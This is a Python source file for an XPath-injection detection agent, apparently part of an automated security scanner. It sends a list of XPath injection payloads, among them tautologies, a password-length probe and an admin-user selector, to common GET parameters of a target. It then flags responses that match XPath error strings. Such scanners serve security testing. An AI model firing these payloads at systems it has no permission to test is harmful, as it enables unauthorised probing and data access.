"""
XPATH Injection detection agent
"""

import asyncio
import httpx
from typing import List

from itzraven.agents.base_agent import BaseAgent, AgentResult
from itzraven.core.logger import get_logger

logger = get_logger()


class XPathInjectionAgent(BaseAgent):
    """Agent for detecting XPATH injection vulnerabilities."""

    def __init__(self, target: str, event_bus=None, memory_manager=None):
        super().__init__("XPATH Injection Agent", target, event_bus=event_bus, memory_manager=memory_manager)
        self.payloads = [
            "' OR '1'='1",
            "' OR ''='",
            '" OR ""="',
            "' OR 1=1 and ''='",
            "' and '1'='1' and '1'='2",
            "' and string-length(password/text())>0 and '1'='1",
            "' or '1'='2' and doc('nonexistent') and '",
            "' | //user[contains(.,'admin')]",
        ]

    async def execute(self) -> AgentResult:
        logger.info(f"{self.name}: Testing {self.target}")
        await self._test_xpath_injection()
        await self._run_nuclei_tags(tags=["xpath-injection"], severity="high")
        return AgentResult(
            agent_name=self.name,
            status=self.status,
            findings=self.findings,
            execution_time=0,
        )

    async def _test_xpath_injection(self) -> None:
        async with httpx.AsyncClient(timeout=10.0, follow_redirects=True) as client:
            params = {"q": "", "search": "", "id": "", "user": "", "name": "", "query": ""}
            for payload in self.payloads:
                for param in params:
                    try:
                        test_params = {param: payload}
                        r = await client.get(self.target, params=test_params)
                        if self._is_xpath_error(r.text) or "true" in r.text.lower() and len(r.text) < 100:
                            self.add_finding(
                                title=f"XPATH Injection via {param}",
                                description=f"Parameter '{param}' may be XPATH injectable with payload: {payload}",
                                severity="high", category="xpath_injection",
                                evidence=f"Param: {param}, Payload: {payload}, Response: {r.text[:300]}",
                            )
                            break
                    except Exception:
                        pass

    def _is_xpath_error(self, text: str) -> bool:
        indicators = [
            "XPATH", "xpath", "XPath", "document evaluator",
            "xmlXPath", "syntax error", "Invalid expression",
            "unclosed", "XPATH_ERROR",
        ]
        return any(i in text for i in indicators)
